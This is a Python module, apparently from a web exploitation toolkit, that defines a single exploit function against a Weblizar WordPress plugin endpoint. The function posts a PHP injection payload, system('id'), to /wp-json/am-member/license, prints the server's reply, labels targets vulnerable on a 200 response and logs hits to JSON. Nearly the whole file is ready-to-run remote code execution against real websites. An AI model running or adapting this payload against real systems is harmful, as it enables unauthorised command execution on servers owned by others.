import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        data = "blowfish=1&blowf=system('id');"
        r = req.post(url + "/wp-json/am-member/license",
                     headers=headers,
                     data=data)
        if r.status_code == 200:
            print(r.text)
            print(colors.yellow + "[+] ==> Weblizar_rce %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": r.url,
                "status": r.status_code,
                "exploit": "Weblizar_rce",
            })
            json_me(url, "Weblizar_rce", found)
        else:

            print(colors.red + "[-] Weblizar_rce ==> %s Not Vulnerable" % url)

    except Exception as e:
        print(e)
        pass
